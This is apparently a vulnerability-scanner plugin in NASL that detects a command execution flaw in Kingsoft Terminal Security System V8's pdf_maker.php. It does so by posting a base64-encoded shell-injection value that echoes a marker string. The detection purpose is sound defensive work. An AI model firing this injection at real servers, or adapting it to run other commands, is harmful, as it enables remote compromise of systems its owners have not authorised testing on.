include("compat.inc");


if (description)
{
  script_id(51799328); #WEBRAY_SID
  script_version("1.3");
  script_name(english:"Kingsoft Terminal Security System V8 pdf_maker.php Command Execution Vulnerability");
  script_summary(english:"Kingsoft Terminal Security System V8 pdf_maker.php Command Execution Vulnerability");
  script_set_attribute(attribute:"description", value:"Kingsoft Terminal Security System V8 pdf_maker.php Command Execution Vulnerability.");
  script_set_attribute(attribute:"solution", value:"update system");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www");
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");


ports = get_kb_list("Services/www");
foreach port (ports){
	result_r = check_remote(port:port);
	if (result_r['vuln']){
		security_hole(port:port, extra:result_r['report']);
		exit(0);
	}
}

function check_remote(port){
	url = "/inter/pdf_maker.php";
	data = "url=IiB8fCBlY2hvIEppbl5TaGFuX0teU2V0dXBfRV54ZWNfUl5jZSB8fA==&fileName=xxx";
	if (get_kb_list("SSL/Transport/"+port)){
		var req =
				'POST '+ url +' HTTP/1.1\r\n' +
				'Host: ' + get_host_ip()+':'+ port+ '\r\n' +
				'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' + '\r\n' +
				'Accept-Encoding: gzip, deflate' + '\r\n' +
				'Content-Type: application/x-www-form-urlencoded' + '\r\n' +
				'Connection: keep-alive'+ '\r\n' +
				'Accept: */*' + '\r\n' + 
				'\r\n'+data;
				
		ssl_reqs = https_req_get(request:req, port:port);
		if ("JinShan_KSetup_Exec_Rce" >< ssl_reqs && "200 OK" >< ssl_reqs){
			report = ssl_reqs;
			return {'vuln':true, 'report':report};
		}
	}
	else{
		res_send = http_send_recv3(method: "POST",port: port, data:data, item: url, add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
		if("JinShan_KSetup_Exec_Rce" >< res_send[2] && "200 OK" >< res_send[0]){
			report = res_send[2];
			return {'vuln':true, 'report':report};
		}

	}
}